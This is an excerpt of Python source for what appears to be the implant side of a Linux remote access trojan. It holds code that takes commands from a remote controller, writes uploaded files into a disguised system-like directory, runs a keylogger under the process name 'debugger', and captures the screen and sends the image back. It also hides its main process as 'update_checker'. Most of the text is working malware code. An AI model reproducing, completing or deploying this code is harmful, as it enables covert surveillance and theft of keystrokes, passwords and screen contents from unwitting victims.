...
class Target:
    ...
    def __init__(self, ip: str, port: int, key: str):
        ...
        self.keyboard_log = read_init("lg")
        self.caps_lock = False
        if(self.keyboard_log == "[NO DATA]"):
            self.keyboard_log = "->"
        else:
            self.keyboard_log = self.keyboard_log + "\n\nEOL\n\n->"
    ...
    def screen_capture(self):
    	res = self.execute_sys_command('command -v import')
    	if (len(res) > 0):
    		res = self.execute_sys_command('import -window root ' + PATH + 'p.jpg')
    	else:
    		res = self.execute_sys_command('command -v xwd')
    		res2 = self.execute_sys_command('command -v convert')
    		if (len(res) > 0 and len(res2) > 0):
    			res = self.execute_sys_command('xwd -silent -root | convert xwd:- ' + PATH + 'p.jpg')
    		else:
    			res = self.execute_sys_command('command -v scrot')
    			if (len(res) > 0):
    				res = self.execute_sys_command("scrot -e 'mv $f " + PATH + "p.jpg'")
    			else:
    				self.execute_sys_command('gsettings set org.gnome.gnome-screenshot default-file-type jpg')
    				res = self.execute_sys_command('gnome-screenshot -p -f ' + PATH + 'p.jpg')
    				self.execute_sys_command('gsettings set org.gnome.gnome-screenshot default-file-type png')
    ...
    def receive(self):
        ...
        # if("|" in data):
            # arr = data.split("|")
            # decr = decrypt(arr[0], self.key)
            # for i in range (1, len(arr)):
                # curr = "upload " + "test." + self.extensions(arr[i][3:6]) + " " + decr
                # decr += curr + "|"
            # return decr
        ...
        for curr_command in commands:
            if not (curr_command == "" or curr_command == "\n" or curr_command.startswith("[No")):
                ...
                # Uploads the specified file to the client system
                    ...
                    os.chdir("/var/tmp/x86_64-linux-gnu/")
                    file = open(value[1], "w")
                    byte_arr = bytearray.fromhex(value[2])
                    file.write(byte_arr.decode().rstrip())
                    self.send_json("File <" + value[1] + "> has been uploaded!\n")
                ...
                # Start keylogger
                    ...
                    proc2 = Process(target=self.start_keylogger, args=(int(value[1]),), name="debugger")
                    proc2.start()
                    self.send_json("Keylogger results pending [" + value[1] + " seconds]\n")

                # Retrieve keylogger results
                elif (value[0] == "logs"):
                    logs = read_init("lg")
                    self.send_json(logs)
                    write_init("lg","[NO DATA]")

                # Do a screenshot
                elif (value[0] == "screencapture"):
                	self.screen_capture()
                	
                	file_data = self.read_file(PATH + "p.jpg").decode('utf-8') + '\n'
                	self.connection.send(file_data.encode('utf-8'))
                	
                	os.remove(PATH + "p.jpg")
...
def get_ntp() -> float:
    ...
    unpacked = unpack(NTP_PACKET_FORMAT, msg[0:calcsize(NTP_PACKET_FORMAT)])
...
def write_init(key: str, value):
    ...
    while True:
        try:
            with open(json_location, "r+") as init:
                # Lock the file
                flock(init.fileno(), LOCK_EX | LOCK_NB)
                
                # Convert to JSON and write data
                data = load(init)
                data[key] = value
                init.seek(0)
                dump(data, init, ensure_ascii=False)
                init.truncate()
                
                # Unlock the file
                flock(init.fileno(), LOCK_UN)
...
def kill_all(proc):
    ...
    '''
    kill_location = PATH + "uninstall.sh"
    Popen(kill_location, shell=True, stdout=PIPE)
...
if __name__ == '__main__':
    try:
        ...
        proc = Process(target=proc_start, name="update_checker")
        proc.start()
